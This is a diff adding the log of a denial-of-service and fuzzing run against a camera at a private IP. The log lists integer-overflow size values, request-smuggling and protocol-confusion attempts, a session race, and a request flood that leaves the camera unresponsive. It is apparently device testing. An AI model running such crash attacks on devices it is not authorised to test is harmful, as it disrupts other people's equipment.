@@ -1,0 +1,136 @@
+[18:17:29] S5 Camera CRASH v3 - Kernel-level escalation
+[18:17:29] Target: 192.168.1.131
+[18:17:29] WARNING: May cause extended downtime. AC power required.
+[18:17:29] 
+[18:17:29] Camera confirmed up. Starting attack sequence.
+[18:17:29] 
+
+>>> STARTING PHASE 1: Integer overflow
+[18:17:29] 
+============================================================
+[18:17:29] PHASE 1: Integer overflow in firmware size
+[18:17:29] ============================================================
+[18:17:29]   size=4294967295 (0xFFFFFFFF (uint32 max)) -> err_critical (40ms)
+[18:17:30]   size=4294967294 (0xFFFFFFFE) -> err_critical (28ms)
+[18:17:30]   size=2147483648 (2^31 (int32 overflow)) -> err_critical (25ms)
+[18:17:31]   size=4294967296 (2^32 (uint32 wrap to 0)) -> err_critical (21ms)
+[18:17:31]   size=1 (minimum) -> err_critical (28ms)
+[18:17:32]   size=0 (zero) -> err_param (156ms)
+[18:17:33]   size=-1 (negative (as decimal)) -> err_param (53ms)
+[18:17:33]   size=9999999999999999 (huge (64-bit?)) -> err_param (37ms)
+[18:17:34]   size=8589934592 (2^33) -> err_critical (39ms)
+[18:17:34]   size=16777216 (2^24 (16MB - typical buffer)) -> err_critical (25ms)
+[18:17:35]   size=65536 (2^16 (64KB)) -> err_critical (41ms)
+[18:17:36]   size=61192 (exact 1 chunk) -> err_critical (25ms)
+[18:17:36]   size=61193 (1 chunk + 1) -> err_critical (32ms)
+[18:17:37]   size=61191 (1 chunk - 1) -> err_critical (27ms)
+[18:17:40]   [post-1] Camera healthy: ok
+[18:17:40] 
+
+>>> STARTING PHASE 2: HTTP smuggling
+[18:17:40] 
+============================================================
+[18:17:40] PHASE 2: HTTP request smuggling
+[18:17:40] ============================================================
+[18:17:40]   smuggling 1: 498 bytes back: b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\nContent-Length: 349\r\n
+[18:17:41]   smuggling 2: 498 bytes back: b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\nContent-Length: 349\r\n
+[18:17:41]   smuggling 3: 498 bytes back: b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\nContent-Length: 349\r\n
+[18:17:42]   smuggling 4: 498 bytes back: b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\nContent-Length: 349\r\n
+[18:17:42]   smuggling 5: 498 bytes back: b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\nContent-Length: 349\r\n
+[18:17:48]   smuggling 6: no response (connection closed?)
+[18:17:49]   smuggling 7: 498 bytes back: b'HTTP/1.0 400 Bad Request\r\nContent-Type: text/html\r\nContent-Length: 349\r\n
+[18:17:54]   smuggling 8: no response (connection closed?)
+[18:17:58]   [post-2] Camera healthy: ok
+[18:17:58] 
+
+>>> STARTING PHASE 3: Concurrent session race
+[18:17:58] 
+============================================================
+[18:17:58] PHASE 3: Concurrent upload session race
+[18:17:58] ============================================================
+[18:17:59]   Results (24 sessions):
+[18:17:59]     [00] exc: TypeError (0ms)
+[18:17:59]     [00] start: err_critical (71ms)
+[18:17:59]     [01] exc: TypeError (0ms)
+[18:17:59]     [01] start: err_critical (21ms)
+[18:17:59]     [02] exc: TypeError (0ms)
+[18:17:59]     [02] start: err_critical (74ms)
+[18:17:59]     [03] exc: TypeError (0ms)
+[18:17:59]     [03] start: err_critical (12ms)
+[18:17:59]     [04] exc: TypeError (0ms)
+[18:17:59]     [04] start: err_critical (13ms)
+[18:17:59]     [05] exc: TypeError (0ms)
+[18:17:59]     [05] start: err_critical (67ms)
+[18:17:59]     [06] exc: TypeError (0ms)
+[18:17:59]     [06] start: err_critical (149ms)
+[18:17:59]     [07] exc: TypeError (0ms)
+[18:17:59]     [07] start: err_critical (148ms)
+[18:17:59]     [08] exc: TypeError (0ms)
+[18:17:59]     [08] start: err_critical (318ms)
+[18:17:59]     [09] exc: TypeError (0ms)
+[18:17:59]     [09] start: err_critical (198ms)
+[18:17:59]     [10] exc: TypeError (0ms)
+[18:17:59]     [10] start: err_critical (60ms)
+[18:17:59]     [11] exc: TypeError (0ms)
+[18:17:59]     [11] start: err_critical (55ms)
+[18:18:02]   [post-3] Camera healthy: ok
+[18:18:02] 
+
+>>> STARTING PHASE 4: Fork bomb
+[18:18:02] 
+============================================================
+[18:18:02] PHASE 4: Fork bomb (200 rapid requests, 30 concurrent)
+[18:18:02] ============================================================
+[18:18:02]   Round 1: 30 concurrent x 3 requests...
+[18:18:04]   Round 1: 30 ok, 0 fail
+[18:18:05]   Round 2: 30 concurrent x 3 requests...
+[18:18:08]   Round 2: 30 ok, 30 fail
+[18:18:09]   Round 3: 30 concurrent x 3 requests...
+[18:18:12]   Round 3: 30 ok, 60 fail
+[18:18:26]   [post-4] Camera NOT healthy: timeout: timed out
+[18:18:26] 
+
+>>> STARTING PHASE 5: Mid-chunk interrupt
+[18:18:26] 
+============================================================
+[18:18:26] PHASE 5: Mid-chunk connection interrupt
+[18:18:26] ============================================================
+[18:18:48]   PHASE 5 EXCEPTION: TypeError: can only concatenate str (not "bytes") to str
+[18:18:51]   [post-5] Camera healthy: ok
+[18:18:51] 
+
+>>> STARTING PHASE 6: Protocol confusion
+[18:18:51] 
+============================================================
+[18:18:51] PHASE 6: Protocol confusion
+[18:18:51] ============================================================
+[18:18:51]   proto 1: 761 bytes: b'HTTP/1.0 200 OK\r\nContent-Type: text/xml\r\nContent-Lengt
+[18:18:56]   proto 2: no response
+[18:19:02]   proto 3: no response
+[18:19:08]   proto 4: no response
+[18:19:13]   proto 5: no response
+[18:19:14]   proto 6: 465 bytes: b'HTTP/1.0 431 \r\nContent-Type: text/html\r\nContent-Length
+[18:19:14]   proto 7: 498 bytes: b'HTTP/1.0 400 Bad Request\r\nContent-Type: text/html\r\nCon
+[18:19:20]   proto 8: no response
+[18:19:24]   [post-6] Camera healthy: ok
+[18:19:24] 
+
+>>> STARTING PHASE 7: Sustained pressure
+[18:19:24] 
+============================================================
+[18:19:24] PHASE 7: 60s sustained pressure
+[18:19:24] ============================================================
+[18:19:24]   Running 10 workers for 60s...
+[18:19:34]   10s: 18 reqs, 30 errors
+[18:19:44]   20s: 18 reqs, 60 errors
+[18:19:54]   30s: 18 reqs, 90 errors
+[18:20:04]   40s: 18 reqs, 130 errors
+[18:20:14]   50s: 18 reqs, 160 errors
+[18:20:24]   60s: 18 reqs, 190 errors
+[18:20:24]   Total: 18 reqs, 200 errors in 60s
+[18:20:37]   [post-7] Camera NOT healthy: timeout: timed out
+[18:20:37] 
+============================================================
+[18:20:37] ALL PHASES COMPLETE
+[18:20:37] ============================================================
+[18:20:38] Final state: err_reject
